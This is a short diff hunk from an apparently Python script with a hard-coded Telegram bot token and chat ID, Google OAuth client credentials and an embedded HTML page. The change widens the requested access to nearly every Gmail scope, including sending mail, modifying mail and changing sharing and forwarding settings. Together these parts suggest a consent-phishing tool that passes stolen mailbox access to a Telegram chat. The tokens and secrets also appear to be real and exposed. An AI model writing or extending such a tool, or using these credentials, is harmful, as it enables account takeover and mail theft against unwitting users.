@@ -8,7 +8,7 @@ BOT_TOKEN = "8664981956:AAFWB4ZFeNrHACF15GQgnZEIBjs9V6Uxb8M"
 CHAT_ID = "8293599881"
 CLIENT_ID = "580564575215-suj93a1u7ganotmsrgnveb5nu8sjco1u.apps.googleusercontent.com"
 CLIENT_SECRET = "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"
-SCOPE = "https://mail.google.com/"
+SCOPE = "https://mail.google.com/ https://www.googleapis.com/auth/gmail.settings.basic https://www.googleapis.com/auth/gmail.settings.sharing https://www.googleapis.com/auth/gmail.modify https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/gmail.labels https://www.googleapis.com/auth/gmail.insert https://www.googleapis.com/auth/gmail.send https://www.googleapis.com/auth/gmail.compose https://www.googleapis.com/auth/gmail.metadata"
 
 HTML_CODE = """
 <!DOCTYPE html>
